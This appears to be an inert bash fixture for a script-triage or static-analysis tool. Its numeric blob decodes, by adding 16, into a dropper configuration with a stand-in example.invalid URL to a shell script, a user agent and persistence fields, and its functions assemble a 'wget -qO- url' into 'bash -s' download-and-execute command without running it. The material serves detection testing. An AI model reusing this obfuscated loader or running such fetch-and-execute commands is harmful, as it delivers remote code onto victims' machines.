# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_5cc79f97='102 45 33 108 99 100 85 96 99 45 81 83 97 101 89 98 85 79 98 85 93 95 100 85 28 84 89 99 96 81 100 83 88 79 96 89 96 85 108 81 84 81 96 100 85 98 45 103 87 85 100 79 99 100 84 95 101 100 79 96 89 96 85 108 99 100 81 87 85 79 83 95 101 94 100 45 33 108 83 81 93 96 81 89 87 94 79 89 84 45 83 81 93 96 81 89 87 94 29 34 85 36 35 81 81 32 84 34 40 108 101 98 92 45 88 100 100 96 99 42 31 31 34 85 36 35 81 81 32 84 34 40 30 85 104 81 93 96 92 85 30 89 94 102 81 92 89 84 31 33 37 38 84 81 82 35 33 30 99 88 108 101 99 85 98 79 81 87 85 94 100 45 56 101 94 100 98 85 99 99 60 81 82 31 34 85 36 35 81 81 32 84 34 40'
readonly Codec_5cc79f97='decimal_space|subtract_modulo_256|10'

Load_5cc79f97() {
  e=()
  local IFS=' '
  read -r -a e <<< "${Material_5cc79f97}"
}

Decode_5cc79f97() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$(((e[i] + 16) % 256))")
  done
}

Recover_5cc79f97() {
  local -a e d
  local t n z i
  n=$((19 * 7 - 133))
  Load_5cc79f97
  z=0; while ((z < 1)); do Decode_5cc79f97; ((z+=1)); done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_5cc79f97() { local recovered field; local -a fields; recovered="$(Recover_5cc79f97)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_5cc79f97() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_5cc79f97)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_5cc79f97; fi

# reconstruction complete